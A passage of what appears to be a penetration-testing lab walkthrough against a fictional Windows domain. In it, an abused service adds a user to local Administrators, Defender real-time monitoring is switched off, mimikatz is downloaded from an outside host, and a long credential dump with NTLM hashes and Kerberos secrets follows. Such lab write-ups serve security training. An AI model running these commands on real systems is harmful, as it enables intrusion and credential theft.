Cmdlet          Trace-Command                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Unblock-File                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Undo-Transaction                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Unprotect-CmsMessage                               3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Unregister-Event                                   3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Unregister-PSSessionConfiguration                  3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Update-FormatData                                  3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Update-Help                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Update-List                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Update-TypeData                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Use-Transaction                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Wait-Debugger                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Wait-Event                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Wait-Job                                           3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Wait-Process                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Where-Object                                       3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Write-Debug                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Write-Error                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Write-EventLog                                     3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Write-Host                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Write-Information                                  3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Write-Output                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Write-Progress                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Write-Verbose                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Write-Warning                                      3.0.0.0    Microsoft.PowerShell.Utility
```


Using the cmdlets New-service and Start-service in order to obtain administrative privilges in local machine:

```
[finance-vanessa.gcbfinance.local]: PS C:\Windows\system32> New-Service -Name ADDAdmin2 -BinaryPathName "cmd /c net localgroup Administrators FINANCE\vanessa /add" -ErrorAction ignore

Status   Name               DisplayName
------   ----               -----------
Stopped  ADDAdmin2          ADDAdmin2


[finance-vanessa.gcbfinance.local]: PS C:\Windows\system32> start-Service -Name ADDAdmin2
```

### 4. Access with local administrative privileges to finance-vanessa.gcbfinance.local:

```
PS C:\Users\itemployee15> Enter-PSSession -ComputerName finance-vanessa.gcbfinance.local -Credential FINANCE\vanessa
[finance-vanessa.gcbfinance.local]: PS C:\Users\vanessa\Documents> whoami
finance\vanessa
[finance-vanessa.gcbfinance.local]: PS C:\Users\vanessa\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
finance\vanessa S-1-5-21-1708299476-1681750518-2103560891-1104


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

### 5. Disable AV and dump Lsass process:

```
[finance-vanessa.gcbfinance.local]: PS C:\Users\vanessa\Documents> Set-MpPreference -DisableRealtimeMonitoring $True
[finance-vanessa.gcbfinance.local]: PS C:\> wget http://192.168.100.15:443/mimikatz.exe -OutFile C:\mimikatz.exe

[finance-vanessa.gcbfinance.local]: PS C:\> C:\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

612     {0;000003e7} 1 D 21796          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;02e76fa0} 0 D 49131084    FINANCE\vanessa S-1-5-21-1708299476-1681750518-2103560891-1104  (09g,24p)                                                                                                                                                     Primary
 * Thread Token  : {0;000003e7} 1 D 49265724    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 4034564 (00000000:003d9004)
Session           : RemoteInteractive from 2
User Name         : vanessa-admin
Domain            : FINANCE
Logon Server      : FINANCE-DC01
Logon Time        : 4/29/2024 12:10:15 AM
SID               : S-1-5-21-1708299476-1681750518-2103560891-1107
        msv :
         [00000003] Primary
         * Username : vanessa-admin
         * Domain   : FINANCE
         * NTLM     : c1e747c37dc5414fb49a832eff85eb0c
         * SHA1     : e114f3621c28fd7da3b23580fd1aa840c34f8cef
         * DPAPI    : 05c70d2fdfaac470a5568c300c507bd2
        tspkg :
        wdigest :
         * Username : vanessa-admin
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : vanessa-admin
         * Domain   : GCBFINANCE.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 4033544 (00000000:003d8c08)
Session           : RemoteInteractive from 2
User Name         : vanessa-admin
Domain            : FINANCE
Logon Server      : FINANCE-DC01
Logon Time        : 4/29/2024 12:10:15 AM
SID               : S-1-5-21-1708299476-1681750518-2103560891-1107
        msv :
         [00000003] Primary
         * Username : vanessa-admin
         * Domain   : FINANCE
         * NTLM     : c1e747c37dc5414fb49a832eff85eb0c
         * SHA1     : e114f3621c28fd7da3b23580fd1aa840c34f8cef
         * DPAPI    : 05c70d2fdfaac470a5568c300c507bd2
        tspkg :
        wdigest :
         * Username : vanessa-admin
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : vanessa-admin
         * Domain   : GCBFINANCE.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3776202 (00000000:00399eca)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:09:10 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : FINANCE-VANESSA$
Domain            : FINANCE
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : finance-vanessa$
         * Domain   : GCBFINANCE.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 27161 (00000000:00006a19)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:56 PM
SID               :
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 48222498 (00000000:02dfd122)
Session           : Service from 0
User Name         : WinRM VA_2_it_itemployee15
Domain            : WinRM Virtual Users
Logon Server      : (null)
Logon Time        : 7/24/2024 10:01:54 PM
SID               : S-1-5-94-2
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : GCBFINANCE.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 41531035 (00000000:0279b69b)
Session           : Batch from 0
User Name         : Administrator
Domain            : FINANCE-VANESSA
Logon Server      : FINANCE-VANESSA
Logon Time        : 5/15/2024 4:27:37 AM
SID               : S-1-5-21-1721651946-1668983529-3760707281-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : FINANCE-VANESSA
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
         * DPAPI    : da39a3ee5e6b4b0d3255bfef95601890
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : FINANCE-VANESSA
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 40505072 (00000000:026a0ef0)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : FINANCE-VANESSA
Logon Server      : FINANCE-VANESSA
Logon Time        : 5/15/2024 4:24:43 AM
SID               : S-1-5-21-1721651946-1668983529-3760707281-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : FINANCE-VANESSA
         * NTLM     : 024c13ecaa0e0fb40c1a3aa009d0a1e7
         * SHA1     : 73330d988e189ab602a934f1189e9d766d0fc5c4
         * DPAPI    : 73330d988e189ab602a934f1189e9d76
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : FINANCE-VANESSA
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : FINANCE-VANESSA
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 40403532 (00000000:0268824c)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/15/2024 4:24:22 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 40403257 (00000000:02688139)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/15/2024 4:24:22 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 40397635 (00000000:02686b43)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/15/2024 4:24:21 AM
SID               : S-1-5-96-0-3
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 3779085 (00000000:0039aa0d)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:09:11 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 3779046 (00000000:0039a9e6)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:09:11 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:58 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 48439 (00000000:0000bd37)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 48356 (00000000:0000bce4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 29075 (00000000:00007193)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 28991 (00000000:0000713f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-96-0-0
